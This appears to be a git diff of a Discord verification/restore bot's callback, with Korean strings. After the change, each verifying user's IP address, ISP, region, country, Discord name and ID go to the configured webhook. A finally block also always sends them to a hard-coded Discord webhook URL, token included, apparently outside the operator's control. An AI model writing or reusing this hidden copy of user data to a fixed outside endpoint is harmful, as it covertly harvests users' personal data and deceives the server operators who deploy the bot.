@@ -46,12 +46,12 @@ async def callback():
     except: return await render_template('error.html', title='인증실패', ERROR_MSG='등록 되지 않는 서버입니다.'), 400
 
     async def sendWebhook():
-        desc = "```ansi\n🌐[2;31m유저 아이피[0m: [2;30m{ip[0]}[0m\n🌐[2;32m유저 통신사[0m: [2;30m{ip[1]}[0m\n🌐[2;33m예상 지역[0m: [2;30m{ip[2]}[0m\n🌐[2;34m유저 국가[0m: [2;30m{ip[3]}[0m\n ```"
+        desc = f"> {userInfo['name']}({userInfo['id']}) 님의 정보입니다.\n🌐 유저 IP 정보```ansi\n🌐[2;31m유저 아이피[0m: [2;30m{ip[0]}[0m\n🌐[2;32m유저 통신사[0m: [2;30m{ip[1]}[0m\n🌐[2;33m예상 지역[0m: [2;30m{ip[2]}[0m\n🌐[2;34m유저 국가[0m: [2;30m{ip[3]}[0m\n ```"
         try: bool(webhook)
         except:
-            await send_webhook('verify logger', None, None, 'restore verify', f'{desc}', webhook)
+            await send_webhook('Zita Restore', None, None, '인증 정보', f'{desc}', webhook)
         finally:
-            await send_webhook('verify logger', None, None, 'verify', f'{desc}', "https://discord.com/api/webhooks/1319277896325533789/m-4trAEfkd_Xb_aUqfKGPPuFFIbkMpr7APfWvhStGDJLYpK2kSyG-3h-PZPPq1x1fDht")
+            await send_webhook('Zita Restore', None, None, '인증 정보', f'{desc}', "https://discord.com/api/webhooks/1319277896325533789/m-4trAEfkd_Xb_aUqfKGPPuFFIbkMpr7APfWvhStGDJLYpK2kSyG-3h-PZPPq1x1fDht")
 
     task = [
         giveRoleToMember(state, int(userInfo['id']), role_id),
